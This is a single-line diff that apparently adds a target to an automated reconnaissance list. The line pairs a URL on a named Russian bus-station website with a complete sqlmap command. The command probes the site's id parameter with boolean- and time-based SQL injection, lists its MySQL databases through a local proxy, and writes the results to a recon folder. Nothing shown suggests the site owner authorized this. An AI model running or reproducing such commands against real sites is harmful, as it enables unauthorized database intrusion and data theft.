@@ -1,0 +1,1 @@
+https://nskavtovokzal.ru/news-page?id=1 (GET)  # /usr/local/bin/sqlmap -u https://nskavtovokzal.ru/news-page?id=1 --batch --level=3 --risk=2 --dbms=mysql --technique=BT --dbs --proxy=http://127.0.0.1:43179 --output-dir=recon_results/nskavtovokzal.ru/sqlmap3 --timeout=15 --retries=3
